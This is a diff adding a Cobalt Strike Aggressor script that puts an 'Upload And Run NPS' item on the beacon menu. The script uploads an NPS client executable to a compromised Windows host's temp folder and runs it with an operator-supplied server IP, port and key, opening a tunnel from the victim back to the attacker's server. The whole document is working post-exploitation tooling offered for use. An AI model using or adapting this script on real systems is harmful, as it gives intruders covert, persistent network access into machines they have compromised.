@@ -1,0 +1,25 @@
+sub NPS {
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("npsx64/npc.exe"));
+    }else{
+        bupload($bid, script_resource("npsx32/npc.exe"));
+    }
+    bshell($bid, $3['UploadPath']."npc.exe -server=".$3['IP'].":".$3['PORT']." -vkey=".$3['VKEY']." -type=".$3['TYPE']);
+}
+
+popup beacon_bottom {
+    menu "NPS" {
+        item "Upload And Run NPS" {
+            $bid = $1;
+            $dialog = dialog("Upload NPS Config", %(UploadPath => "C:\\Windows\\Temp\\", IP => "127.0.0.1", PORT => "8024",PPORT => "",bid => $bid), &NPS);
+            drow_text($dialog, "UploadPath",  "Upload Path: "); 	
+            drow_text($dialog, "IP",  "Server IP: ");
+            drow_text($dialog, "PORT",  "Server PORT: ");
+            drow_text($dialog, "VKEY",  "vkey: ");
+            drow_text($dialog, "TYPE",  "Type:");
+            dbutton_action($dialog, "Upload And Run!");
+            dialog_show($dialog);
+        }
+    }
+}
